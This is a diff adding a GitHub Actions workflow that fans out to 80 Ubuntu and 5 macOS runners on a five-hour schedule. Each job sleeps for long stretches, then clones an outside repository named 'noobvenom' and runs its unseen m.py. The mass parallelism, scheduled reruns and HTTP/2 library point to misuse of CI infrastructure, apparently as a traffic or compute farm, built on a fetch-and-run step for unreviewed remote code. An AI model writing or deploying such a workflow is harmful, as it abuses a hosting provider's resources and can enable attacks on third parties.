@@ -1,0 +1,78 @@
+name: Run Script
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+  schedule:
+    # Runs every 5 hours
+    - cron: '0 */5 * * *'
+
+jobs:
+  run-script-ubuntu:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80]
+      max-parallel: 80
+      fail-fast: false
+    
+    steps:
+    - name: Checkout code (no cache)
+      uses: actions/checkout@v4
+      with:
+        # Explicitly prevent caching of the action itself
+        fetch-depth: 1
+    
+    - name: Install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y python3 python3-pip nodejs npm
+        sleep 3000
+    
+    - name: Install npm packages (no cache)
+      run: |
+        # Force a clean install without using npm's persistent cache[citation:3]
+        npm install chalk@4 hpack --no-fund --no-audit --cache /tmp/empty-cache
+        # Optional: Clear npm cache after install
+        npm cache clean --force
+    
+    - name: Run the script
+      run: |
+        # Clone fresh every time
+        git clone https://github.com/Venompapa1001/noobvenom.git
+        cd noobvenom
+        # Install Python packages without using pip's cache
+        pip install flask --no-cache-dir
+        python3 m.py
+
+  run-script-macos:
+    runs-on: macos-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5]
+      max-parallel: 5
+      fail-fast: false
+    
+    steps:
+    - name: Checkout code (no cache)
+      uses: actions/checkout@v3
+      with:
+        fetch-depth: 1
+    
+    - name: Install Node.js
+      run: |
+        brew install node
+        sleep 3000
+    
+    - name: Install npm packages (no cache)
+      run: |
+        npm install chalk@latest hpack --no-fund --no-audit --cache /tmp/empty-cache
+        npm cache clean --force
+    
+    - name: Run the script
+      run: |
+        git clone https://github.com/Venompapa1001/noobvenom.git
+        cd noobvenom
+        pip install flask --no-cache-dir
+        python3 m.py
